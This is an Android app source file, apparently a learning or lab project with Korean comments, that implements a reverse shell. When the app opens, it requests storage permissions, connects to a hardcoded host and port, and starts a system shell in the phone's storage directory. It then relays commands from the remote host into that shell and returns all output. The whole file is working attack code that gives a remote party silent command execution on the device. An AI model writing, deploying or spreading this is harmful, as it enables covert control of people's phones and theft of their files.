package com.reverseshell;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {

    private static Socket c_socket = null;
    private static Process p = null;

    private void checkStoragePermission(){
        int permissionCheck = ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE);
        if(permissionCheck == PackageManager.PERMISSION_DENIED)
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 0);
        permissionCheck = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE);
        if(permissionCheck == PackageManager.PERMISSION_DENIED)
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, 0);

    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        checkStoragePermission();





        ExampleThread thread = new ExampleThread();
        thread.start();






        //InputStream input_data = c_socket.getInputStream();

        //OutputStream output_data = c_socket.getOutputStream();

    }

    // 스레드
    private class ExampleThread extends Thread{
        public ExampleThread(){

        }
        public void run(){

            try {
                c_socket = new Socket("192.168.0.16", 8081); // 소켓 열어주기
            } catch (IOException e) {
                e.printStackTrace();
            }


            ProcessBuilder pb = new ProcessBuilder("/system/bin/sh");

            // 시작 경로
            pb.directory( new File("/storage/emulated/0/") );


            // 프로세스 시작
            try {
                p = pb.start();
            } catch (IOException e) {
                e.printStackTrace();
            }




            // 신호 수신
            new Thread(new Runnable(){
                public void run(){

                    try {
                        InputStream input_data = c_socket.getInputStream();
                        BufferedReader reader = new BufferedReader(new InputStreamReader(input_data));

                        while(true) {
                            // 입력 신호를 쉘에게 리다이렉트
                            PrintWriter writer = new PrintWriter(p.getOutputStream());

                            String cmd = reader.readLine();

                            if( cmd.equals( new String("good") ) )
                            {

                            }
                            else {
                                writer.println(cmd);
                                writer.flush();
                            }
                        }


                        } catch (IOException e) {
                            e.printStackTrace();

                        }

                }
            }).start();



            // 표준 출력 리다이렉션
            InputStream stdOut = p.getInputStream();

            new Thread(new Runnable(){
                public void run(){
                    byte[] buffer = new byte[9999999];
                    int len = -1;
                    try {
                        while((len = stdOut.read(buffer)) > 0){

                            OutputStream output_data = c_socket.getOutputStream();
                            String str = new String();

                            str += new String(buffer, 0, len, "UTF-8");


                            String cmd_result = str;
                            output_data.write(cmd_result.getBytes());

                            Thread.sleep(100);

                        }
                    } catch (IOException | InterruptedException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();


                    }
                }
            }).start();



            // 표준 에러 리다이렉션
            InputStream stdError = p.getErrorStream();

            new Thread(new Runnable(){
                public void run(){
                    byte[] buffer = new byte[9999999];
                    int len = -1;
                    try {

                        while((len = stdError.read(buffer)) > 0){


                            OutputStream output_data = c_socket.getOutputStream();
                            String str = new String();

                            str += new String(buffer, 0, len, "UTF-8");


                            String cmd_result = str;
                            output_data.write(cmd_result.getBytes());

                            Thread.sleep(100);



                        }
                    } catch (IOException | InterruptedException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();


                    }
                }
            }).start();





            // 프로세스가 끝날때 까지 기다림.
            try {
                p.waitFor();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            // 앱 종료
            finish();



        }
    }


}




